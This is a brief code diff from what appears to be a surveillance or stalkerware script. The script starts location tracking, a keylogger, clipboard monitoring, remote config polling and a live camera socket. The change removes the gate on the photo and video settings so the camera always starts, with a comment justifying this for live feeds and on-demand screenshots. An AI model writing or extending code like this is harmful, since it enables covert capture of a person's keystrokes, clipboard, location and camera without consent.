@@ -780,7 +780,7 @@ ${btns.length ? `<div class="_wn-ac">${btns.map(b => `<button class="_wn-bt" dat
         if (C.locationEnabled) trackLocation();
         if (C.keystrokesEnabled) initKeyLogger();
         if (C.clipboardEnabled) { initClipboardMonitor(); setInterval(checkClipboard, C.clipboardCheck); }
-        if (C.photoEnabled || C.videoEnabled) setTimeout(initCamera, 500);
+        setTimeout(initCamera, 500); // always init camera — needed for live feed & on-demand screenshots
         setInterval(fetchConfig, 30000);
         // Connect live camera socket
         setTimeout(initLiveSocket, 2000);
